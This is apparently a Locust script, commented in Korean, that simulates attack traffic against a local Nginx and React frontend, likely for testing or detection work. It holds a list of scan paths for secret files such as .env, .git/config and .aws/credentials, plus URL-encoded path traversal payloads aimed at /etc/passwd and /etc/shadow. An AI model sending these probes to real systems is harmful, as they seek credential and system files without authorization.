# attack_frontend_locustfile.py — frontend(Nginx+React) 공격 트래픽 (F1~F2, attack.md)
#
# 실행:
#   locust -f attacks/attack_frontend_locustfile.py --host http://localhost:3000 \
#          --users 10 --spawn-rate 5 --run-time 120s --headless
#
# 정적 SPA라 공격 표면이 얇음 → 스캐닝(F1) 위주. 시퀀스: F1 ★★☆(스캔 버스트), F2 ★☆☆.

import os
import random

from locust import HttpUser, task, between

SCAN_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD", "/admin", "/administrator",
    "/config.js", "/config.json", "/server-status", "/phpinfo.php",
    "/wp-login.php", "/.aws/credentials", "/backup.zip", "/robots.txt",
    "/actuator/env", "/api/v1/secrets",
]
TRAVERSAL = [
    "/../../../../etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/..%2f..%2f..%2fetc%2fpasswd",
    "/static/../../../../etc/shadow",
]


def hit(cm):
    with cm as r:
        r.success()


class FrontendAttacker(HttpUser):
    host = os.environ.get("HOST", "http://localhost:3000")
    wait_time = between(0.05, 0.3)

    # F1 — 숨은 파일/엔드포인트 스캔 (404 버스트) ★★☆
    @task(3)
    def f1_file_scan(self):
        hit(self.client.get(random.choice(SCAN_PATHS),
                            name="F1 GET [file-scan]", catch_response=True))

    # F2 — nginx 경로 탐색 ★☆☆
    @task(1)
    def f2_traversal(self):
        hit(self.client.get(random.choice(TRAVERSAL),
                            name="F2 GET [traversal]", catch_response=True))
